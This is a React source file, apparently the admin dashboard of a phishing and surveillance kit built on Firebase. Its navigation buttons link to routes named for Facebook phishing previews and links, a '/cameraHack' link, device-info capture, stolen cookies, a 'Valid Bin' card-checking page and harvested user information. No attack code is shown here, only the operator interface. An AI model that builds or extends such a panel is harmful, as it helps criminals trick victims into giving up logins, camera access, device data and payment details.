
import { NavLink, useNavigate, useParams } from "react-router-dom"
import { auth } from "../../../DATABASE/Config";
import Chat from "../../CHAT/Chat";
import { useEffect } from "react";
import { signOut } from "firebase/auth";
import AdminProfile from "../USERPROFILE/AdminProfile";


const Home = () => {

  const {uid} = useParams();
  const loginNavigate = useNavigate();

  useEffect(() => {
    const unsubscribe = auth.onAuthStateChanged((authUser) => {
      try {
        if (authUser) {
          if(authUser.uid !== uid){
            signOut(auth).then(() => loginNavigate('/'))
          }
        }
      } catch (error) {
        console.log(error);
      }
    });

    return () => unsubscribe()
  }, [uid,loginNavigate]);
  

  return (
    <>
    <AdminProfile uid = {uid} />
    <div>
      
        <div className="h-screen pt-24 flex flex-col items-center justify-center">
            <NavLink to={`/facebook/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Facebook preview</NavLink>
            <NavLink to={`/facebookLink/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700" >Facebook link</NavLink>

            <NavLink to={`/youtube/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Camera preview</NavLink>
            <NavLink to={`/cameraHack/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Camera link</NavLink>

            <NavLink to={`/youtub/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Device preview</NavLink>
            <NavLink to={`/deviceInfo/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Device link</NavLink>

            <NavLink to={`/cookies/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700" >Cookies</NavLink>

            <NavLink to={`/bin/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Valid Bin</NavLink>

            <NavLink to={`/users/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700" >User information</NavLink>

            <NavLink to={`/reports/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Reports</NavLink>

            <NavLink to={`/notice/${uid}`} className="bg-blue-600 w-[250px] m-2 p-3 text-center rounded-2xl font-bold focus:bg-rose-600 hover:border hover:bg-rose-700">Set Notice</NavLink>
        </div>
        <div>
          <Chat />
        </div>
    </div>
    </>
  )
}

export default Home